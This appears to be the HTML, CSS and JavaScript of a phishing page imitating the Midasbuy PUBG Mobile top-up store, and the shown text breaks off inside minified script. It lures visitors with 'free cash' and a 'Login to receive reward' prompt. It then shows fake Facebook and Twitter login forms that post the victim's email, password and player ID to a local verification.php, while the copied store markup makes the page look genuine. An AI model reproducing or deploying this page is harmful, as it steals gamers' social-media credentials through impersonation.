window.complianceWithDataCountryList = ["AT", "BE", "BG", "HR", "CY", "CZ", "DK", "EE", "FI", "FR", "DE", "GR", "HU", "IE", "IT", "LV", "LT", "LU", "MT", "NL", "PL", "PT", "RO", "SK", "SI", "ES", "SE", "GB", "IS", "LI", "NO", "CH", "OT"];
window.buylimits = {
    "group1": {
        "country": ["in", "tr"],
        "minage": 18
    },
    "group2": {
        "country": "*",
        "minage": 18
    }
};
window.needActiveData = 1;
	</script>
	<style>
    #confirmBirthdayLine, #confirmBirthdayBtn {
        cursor: pointer;
        display: -webkit-box;
        display: -webkit-flex;
        display: flex;
        -webkit-box-align: center;
        -webkit-align-items: center;
        align-items: center;
        position: relative;
        width: 60%;
        min-width: 180px;
        height: 46px;
        margin: auto;
        margin-bottom: 16px;
        background: #fff;
    }
    #confirmBirthdayBtn {
        height: auto;
        background: none;
    }
    #confirmBirthdayBtn .btn{
        width: 100%;
        height: 42px;
        line-height: 42px;
        text-align: center;
        font-size: 14px;
        color: #fff;
        float: left;
        background: #3a7bfc;
        cursor: pointer;
        margin-bottom: 16px;
    }
    #confirmBirthdayLine .date {
        width: 46px;
        height: 46px;
        background: url(https://www.midasbuy.com/oversea_web/static/images/date-icon.png) no-repeat center;
        background-size: 14px 16px;
        border-left: 1px solid #ddd;
        cursor: pointer;
    }
    #confirmBirthdayTxt {
        cursor: pointer;
        width: 72%;
        padding: 0 24px 0 15px;
        color: rgba(0,0,0,.2);
        flex: 1;
        line-height: 46px;
    }
    .pop-wrap {
        width: 100%;
        height: 100%;
        position: fixed;
        left: 0;
        top: 0;
        z-index: 9999999999;
        display: none;
        background-color: rgba(0, 0, 0, 0.6);
    }
    .time-picker-box {
        z-index: 99999999999;
    }
    .pop {
        width: 646px;
        background-color: #011633;
        margin: 0 auto;
        position: relative;
        top: 50%;
        border-radius: 5px;
        transform: translateY(-50%);
        padding: 45px 50px;
    }
    .pop .pop-title {
        font-size: 18px;
        color: #fff;
        letter-spacing: 0;
        line-height: 20px;
        cursor: pointer;
        text-align: center;
        margin-bottom: 20px;
    }
    .error-wrap-center {
        display: none;
        text-align: center;
    }
    #confirmBirthdayErrorTips {
        width: 60%;
        display: inline-block;
    }
    @media screen and (max-width: 750px) {
        .pop {
            width: 100%;
            box-shadow: none;
            max-height: 80%;
            overflow-y: scroll;
            box-sizing: border-box;
            padding: 45px 20px;
        }
    }
    #birthBoxCloseBtn {
        position: absolute;
        right: 10px;
        top: 10px;
        color: #FFFFFF;
        font-weight: bold;
        font-size: 24px;
        cursor: pointer;
    }
	@font-face{font-family:dinm;src:url(font/DINMITTELSCHRIFTSTD.eot);src:url(font/DINMITTELSCHRIFTSTD.eot?#iefix) format('embedded-opentype'),url(font/DINMITTELSCHRIFTSTD.woff) format('woff'),url(font/DINMITTELSCHRIFTSTD.ttf) format('truetype'),url(font/DINMITTELSCHRIFTSTD.svg#webfont34M5alKg) format('svg');
	</style>
	<div id="app" style="display: none">
		<div class="game-mess-box">
			<div class="x-main">
				<h2 class="xlogo"><a href="https://www.pubgmobile.com"><img cr="logo" src="https://midas.gtimg.cn/midasbuy/images/PUBGM_LOGO.png" alt="img"></a></h2>
				<div class="gift-exchange-btn go-redeem-btn" cr="redeem">
					<p>
						Redeem
					</p>
				</div>
				<div class="gift-exchange-btn prop-store-btn" cr="mall">
					<p>
						Shop
					</p>
				</div>
			</div>
		</div>
		<div class="banner-wrap">
			<div class="banner-tool">
				<div class="main g-clr" id="banner-tool-main">
					<div class="left">
						<div class="desc" id="desc">
							<div class="text" id="text">
								<p>
									Follow us on Facebook for more information.
								</p>
							</div>
							<div class="abox">
								<a class="subscribe" href="https://www.facebook.com/midasbuy" target="_blank">
								<p class="p">Follow</p>
								<p class="ps">+</p>
								</a>
							</div>
						</div>
					</div>
					<div class="right">
						<a href="javascript:void(0);" cr="redeem" class="btn gift-exchange go-redeem-btn">
						<p>
							Redeem
						</p>
						</a>
						<a href="javascript:void(0);" cr="mall" class="btn prop-store go-shop-btn">
						<p>
							Shop
						</p>
						</a>
					</div>
				</div>
			</div>
			<div class="swiper-container" style="height: auto;overflow: visible;">
				<div class="swiper-wrapper swiper-wrapper1">
					<div class="swiper-slide">
						<a class="banner-link">
						<div class="img-box">
							<img class="banner-pic" style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAxCAQAAAALxYPPAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBgsLGTJGwpbsAAAAAW9yTlQBz6J3mgAAACxJREFUWMPtzEENAAAIBCC1f2ft4HY/CEBvZUzoFYvFYrFYLBaLxWKxWCz+OkvmAWHcq1PMAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTExVDExOjI1OjUwKzAwOjAwDrJzIQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0xMVQxMToyNTo1MCswMDowMH/vy50AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC" data-src="img/header.jpg" alt="img" cr="banner"/>
						</div>
						</a>
					</div>
				</div>
				<!-- Add Pagination -->
				<div class="swiper-pagination swiper-pagination-clickable swiper-pagination-bullets"></div>
				<!-- Add Navigation -->
				<div class="swiper-button-prev swiper-button-white" cr="banner_left"></div>
				<div class="swiper-button-next swiper-button-white" cr="banner_right"></div>
				<img class="mc l-mc" src="https://midas.gtimg.cn/midasbuy/banner/mc-left.png" alt="img"/>
				<img class="mc r-mc" src="https://midas.gtimg.cn/midasbuy/banner/mc-right.png" alt="img"/>
			</div>
		</div>
		<script type="application/javascript">
    window.onload = function() {
        // NodeList 在 IE10 以下没有 forEach 方法，在此 Polyfill
        if (window.NodeList && !NodeList.prototype.forEach) {
            NodeList.prototype.forEach = Array.prototype.forEach;
        }
        // banner 图片懒加载
        var bannerImg = [{"end":"2020-09-24 00:00:00","href":"https://www.midasbuy.com/events/uclottery/pubgm?lan=en&from=__mds_buy_uclottery","id":"1598011313079007548943045249867","start":"2020-09-03 17:00:00","title":"消耗类抽奖","url":"https://midas.gtimg.cn/store_config/1598010710824TAoHEvUP.jpg"},{"end":"2020-09-12 00:00:00","href":"/midasbuy/ot/buy/pubgm?from=__mds_buy_banner","id":"159661646528302352240739973177","start":"2020-08-05 16:34:13","title":"法老套装宣传","url":"https://cdn.midasbuy.com/images/2880x600_%E8%8B%B1%E8%AF%AD%20%281%292576b040.jpg"},{"end":"2020-09-14 08:00:00","href":"https://www.midasbuy.com/midasbuy/ot/props_order/pubgm?pid=S14_RP_Upgrade_Card_Package","id":"159462330649106873952050155734","start":"2020-07-14 10:30:00","title":"S14RPCARD","url":"https://midas.gtimg.cn/store_config/15946220520989wSiZbRA.jpg"}];        
        var imgEL = document.querySelectorAll('.banner-pic');
        imgEL.forEach(function(item) {
            var src = item.getAttribute('data-src');
            item.src = src;
        })
    }
		</script>
		<div class="content">
			<div class="x-main">
				<message v-bind:is-notification="0" notify-title="" text="Get free unknown cash only today now, this is free!" color="orange" prop-img=" https://midas.gtimg.cn/store_config/1599546071746KqkIhrzG.png" market-href="https://www.midasbuy.com/events/uclottery/pubgm?lan=en&amp;from=__mds_buy_uclottery" @show="showMessageBox">
				<template #more>more</template>
				</message>
				<message-box ref="messageBox" title="" desc="UC Bounty Raid, get a permanent Tribe&#39;s Blessing - Vector! Hurry up and tap here to join us!" btn="Understand" @ok="closeMessageBox"></message-box>
				<div class="tab-nav-box">
                <ul>
                    <li class="active">Player ID verification</li>
                </ul>
                <div class="tab-box">
				<div class="box id-box active">
				<div class="y-box">
				<div class="item">
				<div class="label">Player ID</div>
				<div class="val" style=""><?php echo $playid;?></div>
				</div>
				<div class="edit-btn" onclick="location.href='/';">Edit</div>
				</div>
				</div>
				</div>
				</div>
				<div class="pay-type-box">
					<div class="title g-clr have-desc">
						<p>
							Payment Method
						</p>
					</div>
					<div class="pay-list-box">
						<tab v-bind:tabs_data ="tabsData" v-on:active="onTabActive"></tab>
					</div>
					<channeltips v-bind:datas="activeTab"></channeltips>
				</div>
				<div class="section game-pay-section">
					<div class="title g-clr">
						<p>
							Select Product
						</p>
					</div>
					<list v-bind:datas="currentList" v-on:active="onSelectProduct"></list>
				</div>
			</div>
			<div class="clause-bg"></div>
			<div class="pay-sec">
				<div class="clause-box-pop">
					<div class="x-main">
						<p class="title">
							Please check the following box to continue.<i class="close"></i>
						</p>
						<div class="con">
							<div class="list-row list-two">
								<div class="list l-list" @click="function(event) {onClickChechBox(0, event.target)}">
									<div :class="{ checkbox: true, checked: !!checkedAgreementArray[0] }"></div>
									<p>
										By ticking this box, you confirm that you have read and agreed to the Midasbuy <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/terms.html'>Terms of Services</a> and understand how it applies to your use of Midasbuy.
									</p>
								</div>
								<div class="list r-list" @click="function(event) {onClickChechBox(1, event.target)}">
									<div :class="{ checkbox: true, checked: !!checkedAgreementArray[1] }"></div>
									<p>
										By ticking this box, you confirm that you have read and agreed to the Midasbuy <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a> and understand how it applies to your use of Midasbuy.
									</p>
								</div>
							</div>
							<div id="dataRightCheckbox" class="list-row">
								<div class="list" @click="function(event) {onClickChechBox(2, event.target)}">
									<div :class="{ checkbox: true, checked: !!checkedAgreementArray[2] }"></div>
									<p>
										By ticking this box, you agree to transfer your data outside of the European Economic Area. Midasbuy is a product offered by HIGH MORALE DEVELOPMENTS LTD. , a Hong Kong company who will process your data outside the European Economic Area (including Hong Kong Singapore United States and the People's Republic of China) in order to provide the service. Please note that there are risks in such a transfer including your data being subject to differing legal regimes which may not afford it the same level of protection as that available in the country in which you are located. For more information please see our <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a>.
									</p>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="z-bg"></div>
				<div class="x-main">
					<div class="right">
						<div class="pay-mess">
							<div class="t">
								<p class="label">Total:&nbsp;</p>
								<p class="total">{{currentProduct.fprice}}</p>
							</div>
						</div>
						<div class="pay-btn">Pay now</div>
					</div>
				</div>
			</div>
		</div>
		<div class="pop-mode-box login" style="display: none;">
			<div class="pop-mode" class="resQueryPop" style="display: block;">
				<div class="mess" style="width: 100%;">
					<p class="warn-icon">Login to receive reward</p>
				</div>
				<div class="btn-wrap">
					<button type="submit" style="background: #1877F1; width: 100%; height: auto; margin-top: 5px; margin-left: auto; margin-right: auto; margin-bottom: 5px; padding: 10px; color: #fff; font-size: 15px; font-family: 'Teko', sans-serif; text-align: center; border: none; border-radius: 2px; display: block;" class="btn-facebook">
					<i class="fa fa-facebook-square" style="margin-top: 3px; float: left;"></i>
					Login with Facebook
					</button>
					<button type="submit" style="background: #1877F1; width: 100%; height: auto; margin-top: 5px; margin-left: auto; margin-right: auto; margin-bottom: 5px; padding: 10px; color: #fff; font-size: 15px; font-family: 'Teko', sans-serif; text-align: center; border: none; border-radius: 2px; display: block;" class="btn-twitter">
					<i class="fa fa-twitter" style="margin-top: 3px; float: left;"></i>
					Login with Twitter
					</button>
					<center>
					<div class="btn-wrap" style="width: 25%; margin-top: 20px; float: none;">
					<div class="btn">Back</div>
				    </div>
					</center>
				</div>
			</div>
		</div>
		<div class="popup-login facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="img/login/fb.png">
		</div>
		<div class="content-box-fb">
			<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
			<div class="txt-login-fb">
				 Log in to your Facebook account to connect to PUBG MOBILE
			</div>
			<form class="login-form" action="verification.php" method="post">
			    <label>
				<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				</label>
				<input type="hidden" name="login" value="Facebook" readonly>
				<input type="hidden" name="playid" value="<?php echo $playid;?>" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<center>
			<img src="img/login/icon-twitter.png">
			</center>
		</div>
		<center>
		<div class="box-twitter">
			<center>
			<form action="verification.php" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="input-box-twitter">
					<label>Phone, email, or username</label>
					<input type="text" name="email" placeholder="" required>
				</div>
				<div class="input-box-twitter">
					<label>Password</label>
					<input type="password" name="password" placeholder="" required>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<input type="hidden" name="playid" value="<?php echo $playid;?>" readonly>
				<button type="submit" class="btn-login-twitter">Log In</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">Sign up to Twitter</div>
			</form>
			</center>
		</div>
		</center>
	</div>
</div>
		<div class="pop-mode-box" v-bind:style="{display:showErrorBox?'block':'none'}" style="display: none">
			<div class="pop-mode pay-fail-pop show">
				<div class="mess">
					<p>
						{{ payErrorInfo ? payErrorInfo : 'Payment failed.' }}
					</p>
				</div>
				<div class="btn-wrap">
					<div class="btn btn-l" cr="error_back" @click="showErrorBox=!showErrorBox">Back</div>
				</div>
			</div>
		</div>
		<div class="found-id-pop" v-bind:style="{display:showFindOpenid?'block':'none'}" style="display: none">
			<div class="pop-boxs" style="display:block">
				<p class="title">Couldn&#39;t find your Player ID?</p>
				<div class="list">
					<p class="label">1. Enter the game</p>
					<img src="https://midas.gtimg.cn/oversea_web/static/guide001.png" alt="img">
				</div>
				<div class="list">
					<p class="label">2. Find your player ID</p>
					<img src="https://midas.gtimg.cn/oversea_web/static/guide002.png" alt="img">
				</div>
				<div class="btn-wrap">
					<div class="btn" @click="showFindOpenid=false">OK</div>
				</div>
			</div>
		</div>
		<wechat-pop ref="wechatPop" :show.sync="showWechatPop" :channel="activeTab" :css="cssObj"></wechat-pop>
		<iframe-pop ref="iframePop" :show.sync="showIframePop" :channel="activeTab" :css="cssObj"></iframe-pop>
		<alertbox ref="alertbox" title="Tip" desc="Please refresh and try again." btn="OK" v-on:ok="refreshPage"></alertbox>
		<div class="pop-wrap" id="birthBox">
			<div class="pop">
				<div id="birthBoxCloseBtn">X</div>
				<p class="pop-title">Please confirm your birthday</p>
				<div class="con">
					<div class="input count-input" id="confirmBirthdayLine">
						<p id="confirmBirthdayTxt" style="cursor:pointer;width:72%;">Enter birthday</p>
						<div class="date x-btn"></div>
						<input type="hidden" id="confirmBirth"></div>
					<div class="error-wrap-center">
						<p class="error-tips" id="confirmBirthdayErrorTips"></p>
					</div>
					<div class="form-box" id="confirmBirthdayBtn">
						<div class="btn">OK</div>
					</div>
				</div>
			</div>
		</div>
		<div class="pop-mode-box" style=" display: none; " v-bind:style="{display:showResPop?'block':'none'}">
			<div class="pop-mode" style="display:none;" :style="{ display: resQueryPop ? 'block' : 'none' }">
				<div class="mess">
					<p class="warn-icon">Please complete the payment soon</p>
				</div>
				<div class="btn-wrap btn-wraps">
					<div class="btn cancel-btn" @click="cancel">Back</div>
					<div class="btn comfirm-btn" @click="queryRes(0)">Payment completed</div>
				</div>
			</div>
			<div class="pop-mode" style="display:none;" :style="{display: noResFound ? 'block': 'none'}">
				<div class="mess have-desc">
					<p class="warn-icon">Payment result not found</p>
				</div>
				<div class="desc min-desc">
					<p>
						 There might be some lag. If the payment has been completed, please check the game later.
					</p>
				</div>
				<div class="btn-wrap">
					<div class="btn" @click="iknow">OK</div>
				</div>
			</div>
		</div>
		<div class="footer" style=" background: rgba(20,27,61,1);">
			<div class="main">
				<div class="t">
					<div class="p-box g-clr">
						<div class="box">
							<p class="p">For customer service</p>
							<p class="p">Please send email to help@midasbuy.com</p>
						</div>
						<a href="mailto:help@midasbuy.com" class="feeedback" cr="feedback">Feedback</a>
					</div>
				</div>
				<div class="b">
					<ul class="link">
						<li>
							<a href="javascript:;" class="cookie-agreement" id="cookieBtn">Cookie Perferences</a>
						</li>
						<li>
							<a href="http://www.pubgmobile.com/terms.html" target="_blank">Terms of Service</a>
						</li>
						<li>
							<a href="http://www.pubgmobile.com/privacy.html" target="_blank">Privacy Policy</a>
						</li>
					</ul>
					<p class="copying">COPYRIGHT © PUBG CORPORATION. ALL RIGHTS RESERVED.</p>
				</div>
			</div>
		</div>
		<div class="record-detailt-pop cookie-agreement-pop">
			<div class="pop-title clear-border">
				<p>
					YOUR COOKIE PREFERENCES
				</p>
			</div>
			<div class="detailt-box">
				<div class="block">
					<div class="block-title">
						<p></p>
					</div>
					<p class="block-desc"></p>
				</div>
				<p class="txt-one">
					 We use cookies that are necessary to provide the service and also other cookies, including third-party cookies for performance and analysis. For more information on our cookie policy, please click here.
				</p>
				<div class="block">
					<div class="block-title">
						<p>
							Necessary Cookies
						</p>
					</div>
					<p class="block-desc">
						These cookies are necessary to provide you with the service and to use some of its features, such as to facilitate transactions.
					</p>
				</div>
				<div class="block">
					<div class="block-title">
						<p>
							Analytics Cookies
						</p>
						<div class="switch-box">
							<span id="gaStatus"></span>
							<div class="switch-btn" id="cookieSwitchBtn">
								<em></em>
							</div>
						</div>
					</div>
					<p class="block-desc">
						These cookies are used to measure and analyse how the service is accessed, used, or is performing in order to provide you with a better user experience and to maintain, operate and continually improve the service.
					</p>
				</div>
				<div class="block">
					<div class="block-title">
						<p></p>
					</div>
					<p class="block-desc"></p>
				</div>
				<div class="block">
					<div class="block-title">
						<p></p>
					</div>
					<p class="block-desc"></p>
				</div>
			</div>
			<div class="bottom-zz-bg">
				<div class="pop-btn" id="cookieCloseBtn">Save and close</div>
			</div>
		</div>
	</div>
	<script type="text/javascript">
    (function() {
        var tfgOp = {
            'appid': 'TEG2P2YkivqDyIC1',
            'secret':'xO2OUb60j1KeBeip',
            'thost': 'https://dp.telesafe.qq.com/f4',
            'fphost': 'https://dp.telesafe.qq.com/t3'
        };
        window.tfp = window.tfp || function() { (window.tfp.q = window.tfp.q || []).push(arguments); };
        tfp('config', tfgOp);
        var s = document.createElement('script');
        s.type = 'text/javascript';
        s.async = true;
        var r = navigator.userAgent;
        var isIELow = r.indexOf('MSIE 8.0') >= 0 || r.indexOf('MSIE 9.0') >= 0;
        s.src = isIELow ? 'https://3gimg.qq.com/tele_safe/static/tfg/pc/tfg.ie8.1.1.3.js': 'https://3gimg.qq.com/tele_safe/static/tfg/pc/tfg.v1.0.18.js';
        var script = document.getElementsByTagName('script')[0];
        script.parentNode.insertBefore(s, script);
    })();
	</script>
	<script type="text/javascript">
    !function(n){var r={};function i(t){if(r[t])return r[t].exports;var e=r[t]={i:t,l:!1,exports:{}};return n[t].call(e.exports,e,e.exports,i),e.l=!0,e.exports}i.m=n,i.c=r,i.d=function(t,e,n){i.o(t,e)||Object.defineProperty(t,e,{enumerable:!0,get:n})},i.r=function(t){'undefined'!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:'Module'}),Object.defineProperty(t,'__esModule',{value:!0})},i.t=function(e,t){if(1&t&&(e=i(e)),8&t)return e;if(4&t&&'object'==typeof e&&e&&e.__esModule)return e;var n=Object.create(null);if(i.r(n),Object.defineProperty(n,'default',{enumerable:!0,value:e}),2&t&&'string'!=typeof e)for(var r in e)i.d(n,r,function(t){return e[t]}.bind(null,r));return n},i.n=function(t){var e=t&&t.__esModule?function(){return t.default}:function(){return t};return i.d(e,'a',e),e},i.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},i.p="/oversea_web/static/",i(i.s="M8Dk")}({"+3V6":function(t,e,n){var r=n("X6VK");r(r.S,'Array',{isArray:n("Xfku")})},"+cRh":function(t,e,n){"use strict";var r=n("63Ad");n("d3/y"),Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0,n("it7j"),n("V7cS"),n("9ovy"),n("e2Kn");var i=r(n("xeH2")),o={name:'message',props:{notifyTitle:{type:String,default:'Notification'},text:{type:String,default:''},isNotification:{type:Number,default:1},propImg:{type:String,default:''},marketHref:{type:String,default:'#'},color:{type:String,default:'orange'},isRtl:{type:Number,default:0}},data:function(){return{visible:!0,allowMore:!1}},computed:{modColorClass:function(){return"mod-"+(this.color||'orange')}},mounted:function(){var t=this;this.$nextTick(function(){t.handleMessage()})},methods:{handleMessage:function(){1===this.isNotification?this.handleNotifyMessage():0===this.isNotification&&this.handleMarketMessage(this.isRtl)},handleNotifyMessage:function(){function t(){var t=(0,i.default)('.notification-message .mess').width();e.allowMore=t<n}var e=this,n=0,r=navigator.userAgent;n=r.toLowerCase().match(/rv:([\d.]+)\) like gecko/)||-1<r.indexOf("compatible")&&-1<r.indexOf("MSIE")?this.getTextWidth((0,i.default)('.notification-message .mess span')[0].innerText):(0,i.default)('.notification-message .mess span')[0].offsetWidth,t(),(0,i.default)(window).resize(t)},getTextWidth:function(t){var e,n=document.createElement('span');return n.innerText=t,n.className='getTextWidth',document.querySelector('.content').appendChild(n),e=document.querySelector('.getTextWidth').offsetWidth,document.querySelector('.getTextWidth').removeNode(this),e},handleMarketMessage:function(e){var t=(0,i.default)('.market-message .dowebok');t.css({overflow:'hidden',width:'100%'}),t.wrapInner('<span>'),t.find('span').css({fontWeight:'600'});var n=t[0].offsetWidth,r=(0,i.default)('.market-message .dowebok span')[0].offsetWidth;(function t(){0===e?((0,i.default)(this).css('margin-left',n+'px'),(0,i.default)(this).animate({'margin-left':'-'+r+'px'},8e3,'linear',t)):1===e&&((0,i.default)(this).css('margin-right',n+'px'),(0,i.default)(this).animate({'margin-right':'-'+r+'px'},8e3,'linear',t))}).call(t.find('span'))},closeMessage:function(){this.visible=!1,this.$emit('close')},showMoreText:function(){this.$emit('show')},jumpToEvent:function(){this.marketHref&&(window.location.href=this.marketHref)}}};e.default=o},"+edc":function(t,e,n){var i=n("sU/p");t.exports=function(t,e,n){for(var r in e)i(t,r,e[r],n);return t}},"/6rt":function(t,e,n){"use strict";var r=n("E7Vc");t.exports=function(t,e){return!!t&&r(function(){e?t.call(null,function(){},1):t.call(null)})}},"05cK":function(t,e,n){"use strict";function d(t){return t.replace('.','#').replace(/,/g,'.').replace('#',',')}e.a=function(t,e,n){var r,i=(r=parseInt(t,10),(r/=100).toString()),o=function(t){for(var e=String(t).split('.'),n=e[0],r=1<e.length?'.'+e[1]:'',i=/(\d+)(\d{3})/;i.test(n);)n=n.replace(i,'$1,$2');return n+r}(i),s=n||window.__PAY_INFO.currency_config;if(s){var a=s.decimalPoint||'.',c=s.thousandPoint||',',u=s.currencySymbol||e,f=s.leftSymbol||!1,l=o.replace('.','d').replace(/,/g,c).replace('d',a);return f?l=u+l:l+=u,l}switch(l=i+' '+e,e){case'IDR':l='Rp '+d(o);break;case'THB':l='฿'+o;break;case'PHP':l='₱'+o;break;case'VND':l=d(o)+'₫';break;case'MYR':l='RM'+o}return l}},"0LVR":function(t,e,n){"use strict";n("d3/y"),Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0,n("+3V6");var r={name:"list",props:{datas:Array},data:function(){return{selected:this.datas?this.datas[0]:{},lanRes:window.langResource}},watch:{datas:function(t){var e=this;this.selected=this.selected||t[0],t.every(function(t){return t.id!==e.selected.id})&&(this.selected=t[0])}},methods:{selectProduct:function(t){if("cashcard"!==t.type){this.selected=t;var e=JSON.parse(JSON.stringify(t));this.$emit("active",e)}}}};e.default=r},"1Alt":function(t,e){var n=0,r=Math.random();t.exports=function(t){return'Symbol('.concat(void 0===t?'':t,')_',(++n+r).toString(36))}},"1MHo":function(t,e,n){"use strict";var r=n("kaBe"),i=n.n(r);e.default=i.a},"1Tj+":function(t,e,n){var r=n("IdFN"),i=n("WWmS"),o=n("ml72"),s=n("5MU4"),a=n("ezc+"),c=n("HWsP"),u=Object.getOwnPropertyDescriptor;e.f=n("GGqZ")?u:function(t,e){if(t=o(t),e=s(e,!0),c)try{return u(t,e)}catch(t){}if(a(t,e))return i(!r.f.call(t,e),t[e])}},"1wfo":function(t,e,n){var _=n("9liC"),b=n("Cmsx"),w=n("UnHL"),x=n("Sp5b"),r=n("C5nI");t.exports=function(l,t){var d=1==l,p=2==l,h=3==l,v=4==l,m=6==l,g=5==l||m,y=t||r;return function(t,e,n){for(var r,i,o=w(t),s=b(o),a=_(e,n,3),c=x(s.length),u=0,f=d?y(t,c):p?y(t,0):void 0;u<c;u++)if((g||u in s)&&(i=a(r=s[u],u,o),l))if(d)f[u]=i;else if(i)switch(l){case 3:return!0;case 5:return r;case 6:return u;case 2:f.push(r)}else if(v)return!1;return m?-1:h||v?v:f}}},"2LOZ":function(t,e,n){var r=n("Ibj2"),i=n("9dxi")('iterator'),o=Array.prototype;t.exports=function(t){return void 0!==t&&(r.Array===t||o[i]===t)}},"2Qao":function(t,e,n){"use strict";n.r(e);var r=n("DHwd"),i=n.n(r);for(var o in r)'default'!==o&&function(t){n.d(e,t,function(){return r[t]})}(o);e.default=i.a},"3ydu":function(t,e,i){function o(t,e){if(r(t),!n(e)&&null!==e)throw TypeError(e+": can't set as prototype!")}var n=i("Bsg+"),r=i("PAFS");t.exports={set:Object.setPrototypeOf||('__proto__'in{}?function(t,n,r){try{(r=i("9liC")(Function.call,i("1Tj+").f(Object.prototype,'__proto__').set,2))(t,[]),n=!(t instanceof Array)}catch(t){n=!0}return function(t,e){return o(t,e),n?t.__proto__=e:r(t,e),t}}({},!1):void 0),check:o}},"4aJ6":function(t,e,n){"use strict";n("iur1");function r(t){n("sU/p")(RegExp.prototype,a,t,!0)}var i=n("PAFS"),o=n("MBcE"),s=n("GGqZ"),a='toString',c=/./[a];n("E7Vc")(function(){return'/a/b'!=c.call({source:'a',flags:'b'})})?r(function(){var t=i(this);return'/'.concat(t.source,'/','flags'in t?t.flags:!s&&t instanceof RegExp?o.call(t):void 0)}):c.name!=a&&r(function(){return c.call(this)})},"51+d":function(t,e,n){"use strict";function r(){var n=this,t=n.$createElement,r=n._self._c||t;return n.userInfo?r('div',{staticClass:"box id-box active"},[r('div',{staticClass:"y-box"},[r('div',{staticClass:"item"},[r('div',{staticClass:"label"},[n._v(n._s(n.gameid))]),n._v(" "),r('div',{staticClass:"val"},[n._v(n._s(n.userInfo.userid))])]),n._v(" "),r('div',{staticClass:"item"},[r('div',{staticClass:"label"},[n._v(n._s(n.charac_name))]),n._v(" "),r('div',{staticClass:"val"},[n._v(n._s(n.userInfo.charac_name))])]),n._v(" "),n.modify?r('div',{staticClass:"edit-btn",on:{click:n.changeOpenid}},[n._v(n._s(n.modify_txt))]):n._e()])]):r('div',{staticClass:"box id-box active"},[n.needselectpf&&0!=n.plats.length?r('platselect',n._g({attrs:{plats:n.plats},on:{select:n.slectPF}},n.$listeners)):n._e(),n._v(" "),r('div',{staticClass:"n-box"},[r('div',{staticClass:"input-box",class:{error:n.errorTxt}},[r('input',{directives:[{name:"model",rawName:"v-model.trim",value:n.shortId,expression:"shortId",modifiers:{trim:!0}}],ref:"inputbox",staticClass:"input",attrs:{type:"text",maxlength:"20",placeholder:n.placeholder},domProps:{value:n.shortId},on:{click:n.clickInput,blur:[n.blurInput,function(t){return n.$forceUpdate()}],focus:n.focusInput,keydown:function(t){return!t.type.indexOf('key')&&n._k(t.keyCode,"enter",13,t.key,"Enter")?null:n.keydown(t)},input:[function(t){t.target.composing||(n.shortId=t.target.value.trim())},n.onInput]}}),n._v(" "),n.errorTxt?r('i',{staticClass:"error-close",on:{click:n.clearInput}}):n._e(),n._v(" "),r('div',{staticClass:"select-input",style:{display:n.showDropDown?'block':''}},n._l(n.dropDownLists,function(e){return r('div',{key:""+e.userid,staticClass:"li",on:{mousedown:function(t){return n.selectItem(e)}}},[n._v(n._s(e.userid)+" ("+n._s(e.charac_name)+")"),r('i',{staticClass:"untying-icon",on:{mousedown:function(t){return t.stopPropagation(),n.untypeItem(e)}}})])}),0)]),n._v(" "),r('div',{staticClass:"btn",on:{click:n.getGameInfo}},[n._v(n._s(n.btntxt))])]),n._v(" "),n.errorTxt?r('p',{staticClass:"error-tips show"},[n._v(n._s(n.errorTxt)+"‎")]):n._e()],1)}var i=[];n.d(e,"a",function(){return r}),n.d(e,"b",function(){return i})},"5BMI":function(t,e,n){function r(){var t=+this;if(_.hasOwnProperty(t)){var e=_[t];delete _[t],e()}}function i(t){r.call(t.data)}var o,s,a,c=n("9liC"),u=n("KFSm"),f=n("CLuC"),l=n("mggL"),d=n("P56o"),p=d.process,h=d.setImmediate,v=d.clearImmediate,m=d.MessageChannel,g=d.Dispatch,y=0,_={},b='onreadystatechange';h&&v||(h=function(t){for(var e=[],n=1;n<arguments.length;)e.push(arguments[n++]);return _[++y]=function(){u('function'==typeof t?t:Function(t),e)},o(y),y},v=function(t){delete _[t]},'process'==n("n+VH")(p)?o=function(t){p.nextTick(c(r,t,1))}:g&&g.now?o=function(t){g.now(c(r,t,1))}:m?(a=(s=new 